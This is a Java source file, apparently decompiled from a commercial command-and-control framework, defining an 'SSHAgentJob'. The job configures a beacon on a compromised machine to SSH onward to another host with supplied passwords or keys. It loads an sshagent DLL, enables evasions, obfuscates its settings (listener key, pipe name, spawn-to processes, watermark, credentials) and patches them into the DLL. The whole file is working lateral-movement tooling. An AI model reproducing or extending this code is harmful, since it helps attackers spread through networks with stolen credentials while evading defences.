package beacon.jobs;

import beacon.BeaconPayload;
import beacon.Job;
import beacon.Settings;
import beacon.TaskBeacon;
import c2profile.Profile;
import common.CommonUtils;
import common.ScListener;
import common.SleevedResource;
import dns.QuickSecurity;
import pe.PostExObfuscator;

public class SSHAgentJob extends Job {
   protected String host;
   protected String username;
   protected String password;
   protected boolean pubkey;
   protected int port;
   protected ScListener listener;

   public SSHAgentJob(TaskBeacon var1, ScListener var2, String var3, int var4, String var5, String var6, boolean var7) {
      super(var1);
      this.host = var3;
      this.port = var4;
      this.username = var5;
      this.password = var6;
      this.pubkey = var7;
      this.listener = var2;
   }

   public String getDescription() {
      StringBuilder var1 = new StringBuilder();
      var1.append("Tasked beacon to SSH to ").append(this.host).append(":").append(this.port).append(" as ").append(this.username);
      if (this.pubkey) {
         var1.append(" (key auth)");
      }

      if (this.isInject()) {
         var1.append(" into ").append(this.pid).append(" (").append(this.arch).append(")");
      }

      return var1.toString();
   }

   public String getShortDescription() {
      return "SSH status";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/sshagent.x64.dll" : "resources/sshagent.dll";
   }

   public String getPipeName() {
      return "PIPEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
   }

   public String getTactic() {
      return "T1021";
   }

   public int getCallbackType() {
      return 27;
   }

   public int getWaitTime() {
      return 30000;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }

   public byte[] getDLLContent() {
      byte[] var1 = SleevedResource.readResource(this.getDLLName());
      Profile var2 = this.listener.getProfile();
      String var3 = "\\\\%s\\pipe\\" + var2.getSSHPipeName();
      Settings var4 = new Settings();
      var4.addInt(4, 1048576);
      var4.addData(7, this.listener.getPublicKey(), 256);
      var4.addString(29, var2.getString(".post-ex.spawnto_x86"), 64);
      var4.addString(30, var2.getString(".post-ex.spawnto_x64"), 64);
      var4.addString(15, var3, 128);
      var4.addShort(31, QuickSecurity.getCryptoScheme());
      var4.addString(21, this.host, 256);
      var4.addShort(22, this.port);
      var4.addString(23, this.username, 128);
      var4.addShort(55, this.isInject() ? 1 : 0);
      var4.addInt(37, var2.getInt(".watermark"));
      var4.addString(36, var2.getString(".watermarkHash"), 32);
      if (this.pubkey) {
         var4.addString(25, this.password, 6144);
      } else {
         var4.addString(24, this.password, 128);
      }

      var4.addString(56, "SSH-2.0-" + var2.getString(".ssh_banner"), 128);
      BeaconPayload.setupPivotFrames(var2, var4);
      byte[] var5 = var4.toPatch(8192);
      var5 = BeaconPayload.beacon_obfuscate(var5);
      String var6 = CommonUtils.bString(var1);
      int var7 = var6.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
      var6 = CommonUtils.replaceAt(var6, CommonUtils.bString(var5), var7);
      return CommonUtils.toBytes(var6);
   }
}
